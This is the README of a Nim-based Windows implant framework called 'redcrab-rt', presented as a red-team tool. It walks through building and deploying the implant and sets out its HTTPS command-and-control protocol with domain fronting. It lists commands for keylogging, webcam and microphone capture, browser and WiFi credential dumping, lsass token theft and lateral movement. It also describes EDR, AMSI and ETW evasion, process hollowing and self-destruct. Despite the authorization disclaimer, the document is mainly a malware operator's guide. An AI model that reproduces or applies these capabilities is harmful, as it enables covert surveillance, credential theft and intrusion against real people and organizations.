# redcrab-rt

Authorized red team implant framework for lab and engagement use.

> **For authorized engagements only.** Written permission from the target organization is required before use.

---

## Overview

`redcrab-rt` is a **Nim-based** Windows x64 implant with a 12-phase initialization chain, operator-grade evasion stack, and an HTTPS C2 with domain-fronting support. It compiles to a native Windows PE via `nim c` and is configured entirely at build time through `builder.py`.

**What this is not:** a simple reverse shell. Every phase of execution — from process hollowing into `svchost.exe` to sleep-masked RC4 obfuscation to indirect syscalls executing inside `ntdll` — is designed to survive modern EDR inspection.

---

## Quick Start

### 1. Prerequisites

```bash
# Nim 2.x (https://nim-lang.org/install.html)
curl https://nim-lang.org/choosenim/init.sh -sSf | sh
choosenim stable

# winim — Windows API bindings
nimble install winim

# Cross-compile to Windows from Linux/macOS
nimble install mingw-w64   # or use a Windows build machine

# Python 3 for the builder
python3 --version
```

### 2. Set Up Your C2 Listener

```bash
# Terminal 1 — HTTPS listener (socat + openssl, or a teamserver)
# The implant POSTs to /beacon and reads commands; results go to /result; data to /data

# Terminal 2 — if using ngrok for NAT traversal:
ngrok http 443
# note the forwarded HTTPS host — e.g. abc123.ngrok.io
```

### 3. Build the Implant

```bash
python builder.py
```

Prompted values:

| Prompt | Example | Purpose |
|---|---|---|
| `C2 host (Host: header)` | `abc123.ngrok.io` | Real C2 server (sent as HTTP `Host:` header) |
| `Front domain (SNI)` | `update.microsoft.com` | CDN/SNI the TLS handshake presents to the network |
| `C2 port` | `443` | HTTPS port |
| `Beacon interval (ms)` | `15000` | Base beacon sleep in milliseconds |
| `Jitter %` | `30` | ± variance on beacon interval |
| `Working hours start` | `8` | Local hour — beacon goes live |
| `Working hours end` | `20` | Local hour — beacon goes silent |
| `SLEEP_KEY` | *(blank = random)* | 16-byte RC4/XOR sleep-mask key |

Output: `redcrab.exe` (Windows x64 PE)

### 4. Deploy

1. Copy `redcrab.exe` to the target
2. Execute — it runs through the 12-phase init chain silently
3. Your listener receives `POST /beacon` with `id=<COMPUTERNAME>-<USERNAME>`
4. Send a command in the response body; output comes back via `POST /result`

---

## Initialization Chain

Execution follows a strict 12-phase sequence. Each phase must succeed before the next starts.

```
Phase 0  — NT function pointer resolution (indirect syscall table)
Phase 1  — SSN audit: verify critical syscall numbers match ntdll on disk
Phase 2  — Environment gate: sandbox / analysis / VM detection
Phase 3  — VEH guardian: installs Vectored Exception Handler → triggers
           full destruct on any unexpected exception
Phase 4  — Ctrl handler: CTRL+C / SIGTERM → clean wipe
Phase 5  — Bypass layer: SAC bypass → ntdll re-read (EDR unhook) → ETW-Ti
           + AMSI 6-site patch
Phase 6  — Persistence: installs survival mechanism
Phase 6b — Token escalation: enable SeDebugPrivilege early
Phase 7  — Guardian thread: monitors for debuggers/tampering; triggers
           resurrect → re-hollow if the primary image is wiped
Phase 8  — Obfuscated sleep: RC4 sleep-mask before hollowing
Phase 9  — Process hollowing: maps payload into suspended svchost.exe
Phase 10 — Post-injection concealment: module stomp + stack spoof +
           secure zero of payload buffer
Phase 11 — C2 beacon loop: HTTPS POST with jitter + working-hours gate
Phase 12 — Clean exit: uninstall persistence + full destruct
```

---

## Architecture

```
redcrab-rt/
├── builder.py                  ← patches build-time config, runs nim c
├── redcrab.nimble              ← project manifest (requires winim >= 3.9.0)
└── src/
    │
    ├── redcrab.nim             ← WinMain entry + 12-phase init
    ├── defs.nim                ← NT type definitions
    ├── utils.nim               ← djb2 hash helpers
    ├── hashes.nim              ← compile-time API hash table
    │
    ├── ── Syscall layer ──────────────────────────────────────────────────
    ├── syscall.nim             ← raw syscall stubs (inline asm)
    ├── indirect_syscall.nim    ← HalosGate SSN resolution; executes inside ntdll
    ├── ssn_audit.nim           ← verifies critical SSNs against on-disk ntdll
    │
    ├── ── Evasion layer ──────────────────────────────────────────────────
    ├── pe_obfuscate.nim        ← compile-time string XOR; import hash resolution
    ├── unhook.nim              ← page-granular ntdll re-read; wipes EDR API hooks
    ├── etw_patch.nim           ← EtwEventWrite ret-sled (6 sites) + AMSI patch
    ├── sac_bypass.nim          ← Smart App Control: WDAC per-process policy clear
    ├── sleep.nim               ← Foliage APC-chain RC4 sleep mask + heap XOR
    ├── stomp.nim               ← module stomping into xpsservices.dll section
    ├── spoof.nim               ← synthetic call stack frame spoofing
    ├── antidetect.nim          ← sandbox / VM / analysis environment gates
    │
    ├── ── Injection layer ────────────────────────────────────────────────
    ├── loader.nim              ← in-memory PE mapper
    ├── hollow.nim              ← process hollowing into svchost.exe
    ├── threadless_inject.nim   ← EAT-hijack injection (no CreateThread telemetry)
    ├── ppldump.nim             ← PPL removal via BYOVD kernel write primitive
    │
    ├── ── Resilience layer ───────────────────────────────────────────────
    ├── guardian.nim            ← VEH + watchdog thread; triggers destruct on tamper
    ├── watchdog.nim            ← heartbeat loop; re-hollows if primary image wiped
    ├── resurrect.nim           ← drops backup payload from NTFS ADS; re-executes
    ├── persist.nim             ← installs + purges persistence mechanism
    ├── post_shutdown.nim       ← WNF channel persistence across reboots
    │
    ├── ── Credential / post-ex ───────────────────────────────────────────
    ├── token.nim               ← lsass token theft; SeDebugPrivilege; revert
    ├── dpapi.nim               ← CredMan + browser login + WiFi PSK extraction
    ├── keylog.nim              ← WH_KEYBOARD_LL hook; ring buffer; C2 drain
    ├── lateral.nim             ← WMI exec, SMB service exec, host-list spray
    │
    ├── ── Collection ─────────────────────────────────────────────────────
    ├── screenshot.nim          ← desktop BMP capture via GDI
    ├── webcam.nim              ← webcam frame capture via Media Foundation
    ├── mic.nim                 ← microphone WAV recording via WASAPI
    ├── filetransfer.nim        ← upload / download with chunked XOR I/O
    │
    ├── ── Cleanup ────────────────────────────────────────────────────────
    └── selfdestruct.nim        ← multi-stage wipe: overwrite → truncate → rename
                                   → delete; Ctrl handler registration
```

---

## C2 Protocol

**Transport:** HTTPS POST via WinHTTP — traffic profile is indistinguishable from OS update or browser traffic.

**Domain fronting:** The TLS SNI presented to the network is `FRONT_DOMAIN` (a CDN edge or trusted host). The actual `Host:` header inside the encrypted tunnel points to `C2_HOST`. Network monitors see only the CDN SNI.

**Endpoints:**

| Method | Path | Direction | Body |
|---|---|---|---|
| POST | `/beacon` | implant → C2 | `id=<host>-<user>\n` |
| POST | `/result` | implant → C2 | `id=...\nresult=\n<output>` |
| POST | `/data` | implant → C2 | raw binary (screenshot / audio / keylog / dpapi) |
| Response to `/beacon` | — | C2 → implant | plaintext command string |

**Jitter:** splitmix64 PRNG seeded from `GetTickCount64 ^ thread_id`. Each sleep is `base_ms ± JITTER_PCT%`, with a 500 ms floor.

**Working-hours gate:** Outside `[BEACON_HOUR_START, BEACON_HOUR_END)` the implant sleeps `DEAD_SLEEP_SECS` in 5-minute chunks — no beaconing, no network IOCs during off-hours.

**User-Agent rotation:** Cycles through a pool of realistic Windows browser and Windows Update UAs per beacon tick. Data exfil uses the `Windows-Update-Agent` UA to blend large uploads.

---

## C2 Command Reference

All commands are sent as plaintext in the HTTP response body to `/beacon`.

### Shell
```
<any command>              → exec via cmd.exe /C, output returned
```

### Collection
```
screenshot                 → capture desktop BMP → POST /data
webcam                     → capture webcam frame → POST /data
mic <secs>                 → record WAV for <secs> seconds → POST /data
download <path>            → pull file from target → POST /data
upload <path> <size>       → receive file pushed from C2
keylog start               → install WH_KEYBOARD_LL hook
keylog dump                → drain ring buffer → POST /data
```

### Credential Access
```
dpapi dump                 → CredMan + browser logins + WiFi PSKs → POST /data
token escalate             → steal SYSTEM token via lsass impersonation
token revert               → revert thread token to original
```

### Lateral Movement
```
lateral wmi <host> <cmd>        → WMI exec on remote host
lateral smb <host> <bin> <svc>  → copy + exec via SMB service on remote host
lateral spray <cmd> <bin>       → execute against all loaded hosts
hosts load <base64>             → load newline-separated target list (base64-encoded)
```

### Lifecycle
```
selfdestruct               → multi-stage wipe + process exit
exit                       → clean session close (no wipe)
```

---

## Evasion Coverage

| Layer | Technique | Module |
|---|---|---|
| Static signature | No disk write; in-memory only; compile-time XOR obfuscation | `pe_obfuscate.nim` |
| AMSI | 3-site patch before any scan | `etw_patch.nim` |
| ETW-Ti | EtwEventWrite ret-sled across 6 sites | `etw_patch.nim` |
| EDR API hooks | ntdll page-granular re-read | `unhook.nim` |
| Memory scan during sleep | Foliage APC-chain: RC4 PE encrypt + heap XOR during sleep | `sleep.nim` |
| Call stack inspection | Synthetic legitimate frame spoofing | `spoof.nim` |
| Module forensics | xpsservices.dll section stomp | `stomp.nim` |
| Syscall origin check | Indirect syscalls executing inside ntdll | `indirect_syscall.nim` |
| SSN tampering detection | On-disk ntdll SSN audit at startup | `ssn_audit.nim` |
| Smart App Control | WDAC per-process policy clear | `sac_bypass.nim` |
| Thread creation telemetry | Threadless EAT-hijack injection | `threadless_inject.nim` |
| PPL protection | BYOVD kernel write primitive (driver-agnostic scaffold) | `ppldump.nim` |
| C2 traffic fingerprint | HTTPS POST; domain fronting; UA rotation; jitter | `c2.nim` |
| Off-hours IOC | Working-hours gate; dead sleep outside window | `c2.nim` |
| Analysis environment | Sandbox / VM / debugger gate | `antidetect.nim` |
| Tamper response | VEH + watchdog → destruct on unexpected exception | `guardian.nim` |
| Resilience | ADS backup; WNF reboot persistence; re-hollow on wipe | `resurrect.nim`, `post_shutdown.nim` |

---

## Network Setup

```
Target machine
      │
      │  HTTPS POST — SNI: FRONT_DOMAIN
      ▼
CDN / trusted edge host
      │
      │  Host: C2_HOST (inside TLS)
      ▼
Your C2 server (any network)
      │
      └─ /beacon  /result  /data  endpoints
```

ngrok, Cloudflare tunnels, or any HTTPS-terminating reverse proxy work as the relay. No port forwarding or static IP required.

---

## Per-Build Checklist

- [ ] `python builder.py` — enter fresh C2 host, front domain, port, jitter config
- [ ] `SLEEP_KEY` blank → builder generates random 16-byte key automatically
- [ ] Verify your HTTPS listener handles `/beacon`, `/result`, `/data`
- [ ] Confirm front domain resolves and TLS handshake completes from test host
- [ ] SAC set to Off on target VM if testing Windows 11 (Security → App & Browser Control → Smart App Control → Off)
- [ ] Listener running and reachable before deploying binary

---

*For authorized lab and engagement use only.*
